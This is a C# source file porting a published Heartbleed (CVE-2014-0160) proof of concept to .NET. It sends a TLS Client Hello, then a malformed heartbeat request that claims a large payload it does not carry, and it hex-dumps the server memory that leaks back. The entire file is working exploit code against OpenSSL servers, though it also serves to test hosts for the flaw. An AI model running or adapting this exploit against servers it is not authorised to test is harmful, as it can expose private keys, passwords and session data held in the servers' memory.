/*
*  DotNet OpenSSL Heartbleed PoC at https://github.com/ShawInnes/HeartBleedDotNet
*  by Shaw Innes (shaw@immortal.net.au)
*
*  Based on CVE-2014-0160 OpenSSL Heartbleed PoC at https://github.com/pakesson/heartbleed-c
*  by Philip Åkesson (philip.akesson@gmail.com)
*
*  Original Python version at http://www.exploit-db.com/exploits/32745/
*  by Jared Stafford (jspenguin@jspenguin.org)
*/

using Serilog;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace HeartBleed.Net
{
    public class Processor
    {
        public static byte[] GetHello(SSLVersion version)
        {
            byte[] data = {
	                    0x16, 0x03, 0x02, 0x00, 0xdc, 0x01, 0x00, 0x00, 0xd8, 0x03, 0x02, 0x53, 0x43, 0x5b, 0x90, 0x9d,
	                    0x9b, 0x72, 0x0b, 0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97, 0xcf, 0xbd, 0x39, 0x04, 0xcc,
	                    0x16, 0x0a, 0x85, 0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde, 0x00, 0x00, 0x66, 0xc0, 0x14,
	                    0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21, 0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87, 0xc0, 0x0f,
	                    0xc0, 0x05, 0x00, 0x35, 0x00, 0x84, 0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b, 0x00, 0x16,
	                    0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03, 0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f, 0xc0, 0x1e,
	                    0x00, 0x33, 0x00, 0x32, 0x00, 0x9a, 0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e, 0xc0, 0x04,
	                    0x00, 0x2f, 0x00, 0x96, 0x00, 0x41, 0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02, 0x00, 0x05,
	                    0x00, 0x04, 0x00, 0x15, 0x00, 0x12, 0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08, 0x00, 0x06,
	                    0x00, 0x03, 0x00, 0xff, 0x01, 0x00, 0x00, 0x49, 0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,
	                    0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e, 0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,
	                    0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16, 0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,
	                    0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05, 0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,
	                    0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11, 0x00, 0x23, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x01,
	                    0x01 };

            byte hiByte = (byte)((ushort)version >> 8 & 0xff);
            byte loByte = (byte)((ushort)version & 0xff);

            data[1] = hiByte;
            data[2] = loByte;
            data[9] = hiByte;
            data[10] = loByte;

            return data;
        }

        public static byte[] GetHeartBeat(SSLVersion version)
        {
            byte[] data = { 0x18, 0x03, 0x02, 0x00, 0x03, 0x01, 0x40, 0x00 };

            byte hiByte = (byte)((ushort)version >> 8 & 0xff);
            byte loByte = (byte)((ushort)version & 0xff);

            data[1] = hiByte;
            data[2] = loByte;

            return data;
        }

        private const int SSL3_RT_HEADER_LENGTH = 5;
        private bool ReceiveHeader(Socket socket, ref byte type, ref ushort version, ref ushort length)
        {
            byte[] buffer = new byte[SSL3_RT_HEADER_LENGTH];
            length = SSL3_RT_HEADER_LENGTH;

            try
            {
                int receive = socket.Receive(buffer, SSL3_RT_HEADER_LENGTH, SocketFlags.None);
                if (receive != SSL3_RT_HEADER_LENGTH)
                {
                    Log.Error("Invalid HEADER size");
                    return false;
                }
            }
            catch (System.Net.Sockets.SocketException)
            {
                Log.Error("Socket Exception");
                return false;
            }

            type = buffer[0];
            version = (ushort)((buffer[1] << 8) | buffer[2]);
            length = (ushort)((buffer[3] << 8) | buffer[4]);

            return true;
        }

        private bool ReceiveData(Socket socket, ref ushort length, ref byte[] buffer)
        {
            buffer = new byte[length];
            
            int offset = 0;
            int remaining = length;
            int readCount = 0;

            socket.ReceiveTimeout = 5000;

            while (offset < length)
            {
                int receive = socket.Receive(buffer, offset, remaining, SocketFlags.None);
                
                offset += receive;
                remaining -= receive;

                if (readCount++ == 10)
                {
                    Log.Information("Too many consecutive reads");
                    return false;
                }
            }

            return true;
        }

        public bool TestHost(string host, int port = 443)
        {
            SSLVersion requestedVersion = SSLVersion.TLS1_2_VERSION;

            using (Socket socket = new Socket(SocketType.Stream, ProtocolType.IP))
            {
                Log.Information("Trying " + requestedVersion + "...");
                Log.Information("Connecting...");

                socket.Connect(host, port);

                Log.Information("Sending Client Hello...");
                byte[] hello = GetHello(requestedVersion);
                if (socket.Send(hello) != hello.Length)
                {
                    Log.Error("Error while sending HELLO");
                }

                byte[] buffer = null;
                byte type = 0;
                ushort version = 0;
                ushort length = 0;
                bool done = false;

                Log.Information("Waiting for Server Hello...");
                while (!done)
                {
                    if (!ReceiveHeader(socket, ref type, ref version, ref length))
                    {
                        Log.Error("Error while receiving header");
                        return false;
                    }

                    Log.Information("\tReceive Header {Type} {Version} {Length}", (SSLHeaderType)type, (SSLVersion)version, length);

                    if (!ReceiveData(socket, ref length, ref buffer))
                    {
                        Log.Error("Error while receiving data");
                        return false;
                    }

                    if ((SSLHeaderType)type == SSLHeaderType.SSL3_RT_HANDSHAKE)
                    {
                        int offset = 0;
                        // This code will handle situations against IIS etc with multiple handshakes
                        while (!done && offset < length)
                        {
                            SSLHandshakeType handshake = (SSLHandshakeType)buffer[offset];

                            if (handshake == SSLHandshakeType.SSL3_MT_SERVER_DONE)
                            {
                                done = true;
                            }

                            int handshakeLength = ((buffer[offset + 1] << 16) | (buffer[offset + 2] << 8) | buffer[offset + 3]);

                            Log.Information("\tReceive Data {Type} {Length}", (SSLHandshakeType)handshake, handshakeLength);

                            offset += 4; // skip header
                            offset += handshakeLength;
                        }
                    }
                }

                byte[] heartbeat = GetHeartBeat(requestedVersion);

                Log.Information("Sending heartbeat request...");
                if (socket.Send(heartbeat) != heartbeat.Length)
                {
                    Log.Error("Error while sending HEARTBEAT");
                    return false;
                }

                Log.Information("Waiting for heartbeat response...");
                if (!ReceiveHeader(socket, ref type, ref version, ref length))
                {
                    Log.Error("Error while heartbeat response header");
                    return false;
                }

                if (type != (byte)SSLHeaderType.SSL3_RT_HEARTBEAT)
                {
                    Log.Error("Invalid HEARTBEAT response");
                    return false;
                }

                if (!ReceiveData(socket, ref length, ref buffer))
                {
                    Log.Error("Error while receiving data");
                    return false;
                }

                socket.Close();

                Log.Information("{HexDump}", Utility.HexDump(buffer));

                return true;
            }
        }
    }
}
